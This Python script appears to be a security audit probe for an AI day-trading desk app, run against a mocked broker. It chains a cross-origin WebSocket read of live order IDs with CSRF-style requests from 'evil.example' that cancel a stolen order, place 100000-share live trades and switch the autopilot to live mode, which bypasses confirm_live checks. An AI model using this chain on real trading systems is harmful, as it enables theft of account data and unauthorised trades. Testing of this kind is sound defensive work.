import sys, json
sys.path.insert(0, "docs/evidence/probes")
import F_common
alp = F_common.arm(live=True)
import os
os.environ["DESK_DEMO_MODE"] = "0"          # real account_snapshot path
LIVE_ORDER_ID = "7a1f0c2e-REAL-LIVE-ORDER"
def fake(method, url, **kw):
    F_common.CALLS.append({"method": method, "url": url, "json": kw.get("json")})
    if "/trades/latest" in url:  return {"trade": {"p": 1.00}}
    if url.endswith("/v2/account"):
        return {"status": "ACTIVE", "equity": "250000", "last_equity": "250000",
                "cash": "40000", "buying_power": "500000", "daytrade_count": 1}
    if url.endswith("/v2/positions"):
        return [{"symbol": "NVDA", "qty": "500", "side": "long", "avg_entry_price": "155",
                 "current_price": "180", "market_value": "90000", "unrealized_pl": "12500",
                 "unrealized_plpc": "0.16"}]
    if url.endswith("/v2/orders") and method == "GET":
        return [{"id": LIVE_ORDER_ID, "client_order_id": "newsbot-abc", "symbol": "NVDA",
                 "side": "sell", "qty": "500", "type": "limit", "limit_price": "185",
                 "status": "new", "submitted_at": "2026-10-13T13:31:00Z"}]
    if url.endswith("/v2/orders") and method == "POST":
        return {"id": "ORD-ATTACKER-0001", "status": "accepted"}
    if "/v2/orders/" in url and method == "DELETE": return None
    if url.endswith("/v2/clock"):
        return {"is_open": True, "next_open": "", "next_close": "", "timestamp": ""}
    return {}
alp._request = fake

app, client = F_common.app_and_client()
hub = app.state.hub
from trader.desk import account_snapshot
hub.last_account = account_snapshot()          # what the hub's pump caches and pushes

print("=== F1c-CHAIN step 1: cross-origin WebSocket (Origin: https://evil.example) reads LIVE order ids ===")
with client.websocket_connect("/ws/desk", headers={"Origin": "https://evil.example",
                                                   "Host": "desk.evil.example"}) as ws:
    hello = ws.receive_json()["data"]
    acct = hello["account"]
    print("  mode:", acct["mode"], "| equity:", acct["account"]["equity"],
          "| buying_power:", acct["account"]["buying_power"])
    print("  positions:", [(p["symbol"], p["qty"], p["unrealized_pl"]) for p in acct["positions"]])
    stolen = [o["id"] for o in acct["orders"]]
    print("  OPEN LIVE ORDER IDS STOLEN:", stolen)

print()
print("=== F1c-CHAIN step 2: 'simple request' POST cancel of the stolen id (no CT, no preflight) ===")
n = len(F_common.CALLS)
r = client.post(f"/api/desk/orders/{stolen[0]}/cancel",
                headers={"Origin": "https://evil.example", "Host": "desk.evil.example"})
print("  HTTP", r.status_code, r.text)
print("  broker calls:", [(c["method"], c["url"]) for c in F_common.CALLS[n:]])

print()
print("=== F1d: are the confirm_live gates any defence against an attacker? ===")
n = len(F_common.CALLS)
r = client.post("/api/desk/orders",
                json={"symbol": "NVDA", "side": "sell", "qty": 100000, "confirm_live": False},
                headers={"Origin": "https://evil.example"})
print("  confirm_live=False ->", r.status_code, r.text[:120])
n = len(F_common.CALLS)
r = client.post("/api/desk/orders",
                json={"symbol": "NVDA", "side": "sell", "qty": 100000, "confirm_live": True},
                headers={"Origin": "https://evil.example"})
print("  confirm_live=True  ->", r.status_code, r.text[:160])
print("  broker calls:", [(c["method"], c["url"], c["json"]) for c in F_common.CALLS[n:]])
print("  NOTE: ALPACA_LIVE_MAX_ORDER_USD =",
      alp.LiveLimits.from_env().max_order_usd, "-- check_live_buy() returns early for side=sell")

n = len(F_common.CALLS)
r = client.post("/api/desk/orders",
                json={"symbol": "NVDA", "side": "buy", "qty": 100000, "confirm_live": True},
                headers={"Origin": "https://evil.example"})
print("  live BUY 100000 confirm_live=True ->", r.status_code, r.text[:150])

r = client.post("/api/desk/autopilot",
                json={"symbols": ["SPY"], "interval_seconds": 300, "mode": "live", "confirm_live": False})
print("  autopilot mode=live confirm_live=False ->", r.status_code, r.text[:110])
r = client.post("/api/desk/autopilot",
                json={"symbols": ["SPY"], "interval_seconds": 300, "mode": "live", "confirm_live": True})
print("  autopilot mode=live confirm_live=True  ->", r.status_code, r.text[:140])
client.request("DELETE", "/api/desk/autopilot")

print()
print("=== F1d: grep the gates ===")
import subprocess
print(subprocess.run(["grep","-n","confirm_live","/home/user/ai-day-trader-agent/trader/desk.py"],
                     capture_output=True, text=True).stdout)
